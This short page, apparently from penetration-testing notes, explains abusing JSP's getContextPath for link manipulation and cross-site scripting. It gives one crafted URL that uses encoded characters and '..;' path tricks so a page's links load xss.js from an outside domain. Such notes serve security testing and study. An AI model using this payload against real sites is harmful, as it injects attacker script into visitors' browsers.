# JSP

##  **getContextPath** abuse

Info from [here](https://blog.rakeshmane.com/2020/04/jsp-contextpath-link-manipulation-xss.html).

```text
 http://127.0.0.1:8080/&sol;rakeshmane.com/xss.js&num;/..;/..;/contextPathExample/test.jsp
```

Accessing that web you may change all the links to request the information to _**rakeshmane.com**_:

![](../../.gitbook/assets/image%20%2854%29.png)

  


